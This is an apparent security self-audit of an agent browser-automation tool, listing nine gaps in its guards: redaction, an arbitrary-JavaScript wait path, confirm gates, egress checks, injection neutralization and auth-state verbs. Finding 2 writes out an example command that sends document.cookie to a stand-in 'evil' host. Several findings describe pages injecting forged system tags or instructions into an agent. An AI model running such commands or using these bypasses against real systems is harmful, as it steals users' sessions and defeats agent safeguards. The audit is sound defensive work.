# moxxie self-audit — round 3

Lens: adversarial self-audit of moxxie's own `src/` + `evals/`, no external reference.
All anchors below are real files/lines read directly under
`/Users/seventyleven/Desktop/moxxie/skill/agent-browser/src` and `/Users/seventyleven/Desktop/moxxie/evals`.

## Findings

### 1. [P0] `get value @ref` / `get attr @ref <attr>` bypass the redaction choke point entirely
- **Evidence**: `core/handlers.ts` `handleGet`, `case 'value'` (~line 490-496) calls
  `loc.inputValue()` directly and returns `ok({ value: ... })`; `case 'attr'`
  (~497-504) calls `loc.getAttribute(attrName)` directly. Neither passes through
  `redactValue` (`security/redact.ts`), which is only wired into
  `perception/serialize.ts:210` (the snapshot/`get text` path).
- moxxie's own `evals/README.md` §"Known uab finding" already documents this
  exact bug for `get value`, explicitly scoping the trifecta redaction test to
  `snapshot`/`get text` so it stays green while the bug ships. `get attr` on a
  password node's `value` attribute is the same hole and is **not** mentioned
  there — it's an unremarked second instance of the same choke-point gap.
- **Fix (keyless)**: In `handleGet`, route both branches through
  `redactValue(role, name, rawValue, isPassword)` before building the envelope.
  This requires surfacing `role`/`name`/`isPassword` at the ref (already present
  on `RefEntry`/`SnapNode` — `perception/refmap.ts`, `perception/walk.ts`), or
  simpler: re-run `redactValue` using the locator's own `type` attribute
  (`type=password` → force redact) plus the existing card-shape regex on the
  read value, mirroring the serializer's two-signal policy.
- keyless_ok: true, priority: P0.

### 2. [P0] `wait --fn <expr>` is unauthenticated arbitrary JS execution — quarantine bypass
- **Evidence**: `actuation/wait.ts` `waitFor()`, the `{ fn }` branch (line 81) calls
  `page.waitForFunction(spec.fn, ...)` — Playwright evaluates an arbitrary
  JS expression in page context. `security/registry.ts` `READ_ONLY_VERBS`
  (line 24-46) includes `'wait'`, and `'eval'` is deliberately kept out of
  `READ_ONLY_VERBS`, gated behind `--enable-actions` in `ACTOR_VERBS` (line 53-77)
  specifically because it can "run arbitrary code" (comment, `confirm.ts` line 23).
  `core/handlers.ts` `handleWait`/`buildWaitSpec` (line 574-599) never checks
  `--enable-actions` and forwards `flags.fn` straight into the wait spec.
- Net effect: an agent (or a page that has injected instructions into the
  agent's context) can run `moxxie wait --fn "fetch('https://evil/steal',{method:'POST',body:document.cookie})"`
  under **pure default flags** — no `--enable-actions` needed — completely
  defeating the phase-quarantine registry's stated guarantee ("a disabled verb
  is literally NOT in the dispatchable set", `registry.ts` line 4-8).
- **Fix (keyless)**: Either (a) drop `{ fn }` from the read-only-reachable wait
  taxonomy and require `--enable-actions` for that one branch specifically
  (check `flags.enableActions` in `buildWaitSpec` before accepting `flags.fn`,
  mirroring the `eval` gate), or (b) move `'wait'` itself into a
  conditionally-gated verb wherever `--fn` is used, e.g. `wait` w/o `--fn` stays
  read-only, `wait --fn` requires actions. No model call needed either way.
- keyless_ok: true, priority: P0.

### 3. [P0] Confirm gate is a no-op unless the operator opts in with `--confirm-actions`
- **Evidence**: `core/handlers.ts` `handleAct` (line 396):
  `if (flags.confirmActionsProvided && requiresConfirm(verb)) { ... }`. If the
  operator never passes `--confirm-actions` (the common case — most agent
  harnesses just pass `--enable-actions`), the gate is skipped unconditionally
  and every mutating verb (`click`, `fill`, `upload`, `check`, …) dispatches
  with **no consent check at all**, even non-interactively. `security/confirm.ts`'s
  own doc (line 6-7) says the gate should "FAIL CLOSED" on non-TTY unless
  pre-approved — but that fail-closed logic (`confirmGateDecision`) is only
  reached when `--confirm-actions` was supplied in the first place.
- This is a real, intentional trade-off documented inline ("so the primary
  non-TTY agent-driving path... is not bricked") — but it means the "destructive
  actions need human consent" story only holds when the operator remembers to
  pass a second flag. Silent default is unconfirmed mutation.
- **Fix (keyless)**: Default `flags.confirmActionsProvided` behavior should still
  run `confirmGateDecision` for `ctx.destructive`/`ctx.paid`-flagged actions
  (see finding 4) even without `--confirm-actions`, so at minimum semantically
  dangerous clicks (Buy/Delete/Submit-payment) fail closed on non-TTY by
  default, while ordinary `click`/`fill` stay ungated for the agent-driving path.
  This requires wiring finding 4 first.
- keyless_ok: true, priority: P0.

### 4. [P1] `ConfirmContext.destructive`/`.paid` semantic escalation is dead code
- **Evidence**: `security/confirm.ts` `requiresConfirm(verb, ctx?)` (line 56-59)
  accepts a `ctx: { destructive?: boolean; paid?: boolean }` explicitly designed
  so "an otherwise-benign verb landing on a 'Buy' / 'Delete' control" escalates
  to confirm-required (doc comment line 53-55). Grepping all of `src/` for
  `requiresConfirm(` shows exactly one call site — `core/handlers.ts` line 396 —
  and it calls `requiresConfirm(verb)` with **no second argument**, ever. No
  module anywhere constructs a `ConfirmContext`. The feature is fully wired at
  the type level and completely unreachable at runtime.
- **Fix (keyless)**: Add a cheap keyless heuristic at the point `handleAct`
  already has the grounded ref's accessible name/role (`refmap.ts` `RefEntry`)
  — regex the name against a small destructive/paid word list ("delete",
  "remove", "buy", "purchase", "pay", "confirm order", "checkout", "cancel
  subscription", …) and set `ctx.destructive`/`ctx.paid` accordingly before
  calling `requiresConfirm(verb, ctx)`. Pure string matching, no model.
- keyless_ok: true, priority: P1.

### 5. [P1] Egress guard is only checked at `open`/`goto`/`read <url>` — in-page navigation (link clicks, form submits, JS redirects) is never checked
- **Evidence**: `command grep -rn "assertNavigable"` across `src/` finds exactly
  two call sites: `core/handlers.ts` `handleOpen` (line 239) and `handleRead`
  (line 354-358) — both operate on a URL the CLI itself is about to navigate to.
  `actuation/actions.ts` `dispatch()`/`applyVerb()` (the `click`/`dblclick`
  handlers, line 258-263) call `locator.click()` directly with **no** egress
  check before or after — if the click causes Playwright to navigate (a normal
  `<a href>` or a JS `location.href=` handler), the resulting navigation is
  never run through `assertNavigable`. The module doc for `egress.ts` itself
  says the guard must sit "at the lowest layer [the CLI] controls so a
  compromised/injected agent loop cannot route around it" (line 19-21) — but
  the actual lowest layer for click-driven navigation (`actions.ts`) has no
  such check.
- Concretely: with `--enable-actions` (which any real agent session needs for
  anything beyond passive reading), a page can carry a link to
  `file:///etc/passwd` or an SSRF target on a raw-IP host, and `click @eN` on it
  navigates there with zero egress enforcement, even though `open file:///etc/passwd`
  directly is correctly blocked (this exact asymmetry is the trifecta gate's own
  test 1, `evals/harness/trifecta.mjs` line 72-73 — but only for `open`).
- **Fix (keyless)**: After any `click`/`dblclick` (or any verb that can trigger
  navigation) resolves, check `page.url()` against `assertNavigable` (same as
  `settleAndFingerprint` already inspects the URL post-action,
  `actuation/pagechange.ts`) and, if it landed on a blocked target, navigate
  back / abort and return `navigation_blocked` instead of `ok`. Pure heuristic,
  no model.
- keyless_ok: true, priority: P1.

### 6. [P1] `get value` / `get attr` also bypass output capping and prompt-injection neutralization (a second, independent hole at the same seam as #1)
- **Evidence**: `core/handlers.ts` `presentPageText()` (line 148-151) is the
  single choke point applying `capOutput` + `neutralize` (`security/injection.ts`).
  It is called by `handleRead`, `handleSnapshot`, and the `handleGet` `'text'`
  branch (both the whole-page and the ref sub-branch, line 480-489) — but
  **not** by the `'value'` branch (line 490-496) or the `'attr'` branch
  (497-504), which both return the raw string straight from Playwright with no
  `maxOutput` cap and no boundary-fencing/forged-role-tag stripping.
- A page can put an arbitrarily long string, or a forged `<system>...</system>`
  block, into an `<input value="...">`/any other attribute, and `get value` /
  `get attr` deliver it to the host completely raw and unbounded — the exact
  attack class `neutralize()` exists to stop (`injection.ts` line 2-19), just
  reachable through an unguarded sibling command.
- **Fix (keyless)**: Wrap both branches' return values in `presentPageText`,
  same as the `'text'` branch already does.
- keyless_ok: true, priority: P1.

### 7. [P2] `--incognito` is parsed but never wired to anything — silent no-op, false sense of isolation
- **Evidence**: `core/flags.ts` declares `incognito: boolean` (line 39),
  registers it as a bool flag (line 102), defaults it `false` (line 140) — but
  `command grep -rn "incognito"` across all of `src/` returns only those three
  `flags.ts` hits. `core/handlers.ts` `openOpts()` (line 116-118) forwards only
  `{ headed: flags.headed }` to `session.ts`; `session.ts` `OpenOptions`
  (line 29-38) has no `incognito`/isolation field, and `openSession` always
  reuses the same on-disk `userDataDir` (`<sessionDir>/profile`, line 87) for a
  given session name regardless of the flag. An operator who passes
  `--incognito` believing they get a fresh, isolated profile gets the exact
  same persistent-profile session as without the flag.
- **Fix (keyless)**: When `flags.incognito` is set, either (a) use
  `chromium.launch()` + `browser.newContext()` with no `userDataDir` persistence
  for that session (dropping the on-disk profile instead of writing to it), or
  at minimum (b) fail loudly (`badRequest`) instead of silently ignoring the
  flag, consistent with moxxie's own "never fake it" posture used elsewhere
  (`tab`/`frame`/`network`/`dialog`/`pdf` all correctly return
  `not implemented in v1` rather than silently no-op'ing, `handlers.ts` line 218-227).
  Silently swallowing `--incognito` is the one place that "never fake" principle
  is not followed.
- keyless_ok: true, priority: P2.

### 8. [P2] `state load` known localStorage gap — already flagged in-code but no fix shipped; concrete keyless fix available
- **Evidence**: `core/handlers.ts` `handleStateVerb`, `sub === 'load'` branch
  (line 696-712): the code comment reads "NOTE (v1): localStorage/origins from
  storageState are not replayed here (would require navigating each origin).
  Cookies are applied. See report." — moxxie already self-documents this gap;
  it just hasn't been closed.
- **Fix (keyless)**: `parsed.origins` (Playwright's `storageState()` JSON shape
  includes `origins: [{origin, localStorage: [{name,value}]}]`) can be replayed
  without navigating anywhere the operator didn't already ask for, via
  `context.addInitScript()` scoped per-origin (Playwright supports origin-scoped
  init scripts) that seeds `localStorage` before the first navigation to that
  origin, OR — simpler and fully keyless — iterate `parsed.origins`, navigate the
  page to each `origin` once, `page.evaluate` to set the `localStorage` pairs,
  then continue. Either is pure browser automation, no model involved.
- keyless_ok: true, priority: P2.

### 9. [P2] `state`/`cookies` verbs sit in `READ_ONLY_VERBS` despite mutating auth state
- **Evidence**: `security/registry.ts` `READ_ONLY_VERBS` (line 24-46) includes
  `'state'` and `'cookies'`. `handleStateVerb`'s `load` branch and
  `handleCookies`'s `set` branch (`core/handlers.ts` line 686-732) both call
  `context.addCookies(...)`, i.e. they mutate the live browser's authentication
  state — arguably a "mutating" action by the same logic that puts `check`/
  `select` behind `--enable-actions` (`MUTATING_VERBS`, `confirm.ts` line 25-44).
  They're operator-driven (a local file path, not page content), which is a
  reasonable argument for treating them differently from page-driven actor
  verbs — but the current placement means an agent with zero `--enable-actions`
  can still silently authenticate the session as someone else via
  `cookies set --curl <file>`, which is a broader capability than any single
  read-only verb.
- **Fix (keyless)**: Either document explicitly why auth-mutation is excluded
  from the actor-verb gate (operator-supplied file vs. page-derived target is a
  legitimate distinction), or move `cookies set`/`state load` behind
  `--enable-actions` for consistency with the "mutating = gated" story. Low
  urgency since the input is local-file-controlled, not page-controlled — worth
  a decision either way, not obviously worth churn. Could be `skip-cargo-cult`
  if the team decides operator-supplied files are trusted by definition.
- keyless_ok: true, priority: P2, recommendation: align (decide + document
  explicitly, don't leave it implicit).

## Cargo-cult / skip note
`MUTATING_VERBS` (`confirm.ts`) and `ACTOR_VERBS` (`registry.ts`) both list several
verbs — `download`, `keydown`, `keyup`, `keyboard`, `set`, `mouse`, `dialog`,
`eval` — that have **no matching case** in `core/handlers.ts`'s `handle()`
switch; dispatch falls through to `notImplemented()` for all of them today.
Their presence in the gating tables is harmless (correctly-conservative
scaffolding for verbs not yet built) and consistent with moxxie's "never fake"
policy — not a bug, just noted so a future implementer doesn't assume the
gating alone proves the verb works. No action needed; recommendation:
skip-cargo-cult (don't prune the tables, don't treat their presence as done).
